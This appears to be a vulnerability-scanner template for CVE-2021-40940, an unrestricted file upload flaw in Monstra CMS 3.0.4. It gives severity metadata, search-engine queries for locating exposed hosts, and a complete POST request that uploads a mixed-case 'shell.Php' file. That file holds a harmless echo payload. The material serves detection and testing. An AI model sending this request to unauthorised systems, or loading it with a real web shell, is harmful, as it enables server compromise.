id: CVE-2021-40940

info:
  name: Monstra 3.0.4 Unrestricted File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Monstra 3.0.4 does not filter the case of PHP file extensions, leading to an unrestricted file upload vulnerability.
  impact: |
    Successful exploitation could result in unauthorized access, data loss, and potential compromise of the entire system.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a version that restricts file uploads to prevent unauthorized access.
  reference:
    - https://github.com/monstra-cms/monstra/issues/471
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-40940
    cwe-id: CWE-434
    epss-score: 0.00216
    epss-percentile: 0.60341
    cpe: cpe:2.3:a:monstra:monstra:*:*:*:*:*:*:*:*
  metadata:
    vendor: monstra
    product: monstra
    shodan-query: http.favicon.hash:419828698
    fofa-query: icon_hash=419828698

http:
  - method: POST
    path:
      - "{{BaseURL}}/monstra/admin/index.php?id=filesmanager&path=uploads/"

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD6KF8q8SlXAspgP7
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
      Referer: "{{BaseURL}}/monstra/admin/index.php?id=filesmanager&path=uploads/"

    body: |
      ------WebKitFormBoundaryD6KF8q8SlXAspgP7
      Content-Disposition: form-data; name="csrf"

      8ff9a93b1f09f4dfa18e06c201b7355e602ea9ce
      ------WebKitFormBoundaryD6KF8q8SlXAspgP7
      Content-Disposition: form-data; name="file"; filename="shell.Php"
      Content-Type: text/plain

      <?php echo "This is a test";?>
      ------WebKitFormBoundaryD6KF8q8SlXAspgP7
      Content-Disposition: form-data; name="upload_file"

      上传
      ------WebKitFormBoundaryD6KF8q8SlXAspgP7--
    matchers:
      - type: word
        words:
          - "This is a test"
        part: body
